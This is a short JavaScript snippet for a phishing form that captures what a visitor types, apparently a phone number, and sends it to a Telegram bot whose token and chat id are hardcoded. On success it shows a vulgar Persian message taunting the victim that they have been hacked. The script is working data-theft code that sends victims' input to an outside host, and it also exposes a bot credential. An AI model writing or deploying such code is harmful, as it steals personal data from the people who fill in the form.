document.getElementById("loggerForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission
  
    var data = document.getElementById("data").value; // Get the data from the input field
  
    // Send the data to the Telegram bot using the fetch API
    fetch("https://api.telegram.org/bot8159206820:AAGJSqUb0ema6c7PseIAFjxfkKWVvOo_pRo/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "1852045127",
        text: data
      })
    })
    .then(function(response) {
      if (response.ok) {
        alert("ببخشی کونی ولی هک شدی دیگایش هم به کیرم 💀😂");
      } else {
        alert("لطفا شماره خود را صحیح وارد کنید🙏");
      }
    })
    .catch(function(error) {
      console.error("An error occurred:", error);
    });
  });